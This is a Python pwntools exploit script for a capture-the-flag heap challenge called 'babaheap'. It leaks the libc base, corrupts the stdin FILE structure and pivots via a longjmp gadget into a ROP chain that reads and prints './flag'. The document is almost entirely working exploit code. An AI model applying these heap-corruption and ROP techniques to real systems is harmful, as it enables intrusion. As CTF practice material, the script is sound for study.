from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('babaheap')
# io = remote('node4.buuoj.cn', 26888)
libc = ELF('libc.so')
elf = ELF('babaheap')

'''
.text:0000000000078D0D loc_78D0D:
.text:0000000000078D0D mov     rbx, [rdi]
.text:0000000000078D10 mov     rbp, [rdi+8]
.text:0000000000078D14 mov     r12, [rdi+10h]
.text:0000000000078D18 mov     r13, [rdi+18h]
.text:0000000000078D1C mov     r14, [rdi+20h]
.text:0000000000078D20 mov     r15, [rdi+28h]
.text:0000000000078D24 mov     rdx, [rdi+30h]
.text:0000000000078D28 mov     rsp, rdx
.text:0000000000078D2B mov     rdx, [rdi+38h]
.text:0000000000078D2F jmp     rdx
.text:0000000000078D2F longjmp endp
.text:0000000000078D2F
'''


def add(size, content = b'\n'):
    io.sendlineafter('Command: ', '1')
    io.sendlineafter('Size: ', str(size))
    io.sendafter('Content: ', content)


def edit(index, size, content):
    io.sendlineafter('Command: ', '2')
    io.sendlineafter('Index: ', str(index))
    io.sendlineafter('Size: ', str(size))
    io.sendafter('Content: ', content)


def delete(index):
    io.sendlineafter('Command: ', '3')
    io.sendlineafter('Index: ', str(index))


def show(index):
    io.sendlineafter('Command: ', '4')
    io.sendlineafter('Index: ', str(index))


def pwn():
    add(0x1b0)                          # 0
    add(0x110)                          # 1
    add(0x110)                          # 2
    add(0x10)                           # 3
    add(0x110)                          # 4
    add(0x10)                           # 5
    delete(0)
    delete(2)
    edit(0, 2, b'\n')
    add(0x1b0)                          # 0
    add(0x1b0)                          # 2
    delete(1)
    show(2)
    libc_base = u64(io.recvuntil(b'\x7f\x00\x00')[-8:]) - 0xb0b00
    log.success('libc_base: ' + hex(libc_base))
    __stdin_FILE = libc_base + 0xb0180
    open = libc_base + libc.sym['open']
    read = libc_base + libc.sym['read']
    write = libc_base + libc.sym['write']
    longjmp = libc_base + 0x0000000000078D0D
    pop_rdi_ret = libc_base + 0x0000000000015291
    pop_rsi_ret = libc_base + 0x000000000001d829
    pop_rdx_ret = libc_base + 0x000000000002cdda
    ret = libc_base + 0x0000000000015292

    filename = b'./flag'
    filename_addr = libc_base + 0xb3320
    ropchain_addr = filename_addr + 0x10
    buf = ropchain_addr + 0x100
    ropchain  = filename.ljust(0x10, b'\x00')
    ropchain += p64(pop_rdi_ret) + p64(filename_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open)
    ropchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(0x40) + p64(read)
    ropchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(0x40) + p64(write)
    edit(0, len(ropchain) + 1, ropchain)

    fake_stdin  = p64(73)                       # flags
    fake_stdin += p64(0)                        # rpos
    fake_stdin += p64(0)                        # rend
    fake_stdin += p64(libc_base + 0x5ac00)      # close
    fake_stdin += p64(0)                        # wend
    fake_stdin += p64(0)                        # wpos
    fake_stdin += p64(ropchain_addr)            # mustbezero_1 / rsp
    fake_stdin += p64(ret)                      # wbase / rip
    fake_stdin += p64(libc_base + 0x5acf0)      # read
    fake_stdin += p64(longjmp)                  # write

    edit(2, 0x11, p64(__stdin_FILE - 0x20) * 2)
    add(0x1b0)                          # 1
    delete(4)
    edit(2, 8, p64(__stdin_FILE - 0x20)[:7])
    add(0x110)                          # 4
    edit(4, 0x61, b'\x00' * 0x10 + fake_stdin)
    # gdb.attach(io)
    io.sendlineafter('Command: ', '5')
    # pause()
    flag = io.recv()
    log.success(flag.decode())


if __name__ == '__main__':
    pwn()

